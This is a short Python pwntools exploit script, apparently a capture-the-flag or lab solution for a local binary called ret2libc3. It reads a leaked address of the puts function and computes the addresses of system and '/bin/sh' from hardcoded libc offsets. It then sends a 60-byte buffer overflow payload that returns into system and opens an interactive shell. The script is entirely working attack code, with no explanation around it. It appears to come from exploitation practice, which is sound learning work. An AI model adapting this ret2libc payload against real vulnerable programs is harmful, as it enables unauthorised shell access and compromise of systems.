from pwn import *


def ret_libc3_1(file_name='/mnt/hgfs/Cyber Security PWN/ROP/ret2libc3/ret2libc3'):
    print('ret_libc3 start')

    io = process([file_name])
    print(io.recv().decode())

    io.sendline('134520860')

    ''' 13000A  
        put     0x00071CD0 0xf7d6acd0
        system  0x00045830 0xF7D3E830
        /bin/sh 0x00192352
    '''
    puts_ptr = int(str.split(io.recvline().decode(), ':')[1], 16)
    print(puts_ptr)
    system_ptr = puts_ptr - (0x00071CD0 - 0x00045830)  # 0x2C4A0
    bin_sh_ptr = puts_ptr + (0x00192352 - 0x00071CD0)  # 0x120682

    print(io.recv())

    payload = b'A' * 60 + p32(system_ptr) + b'A' * 4 + p32(bin_sh_ptr)

    io.sendline(payload)

    io.interactive()
    print('ret_libc3 end')


if __name__ == '__main__':
    ret_libc3_1()
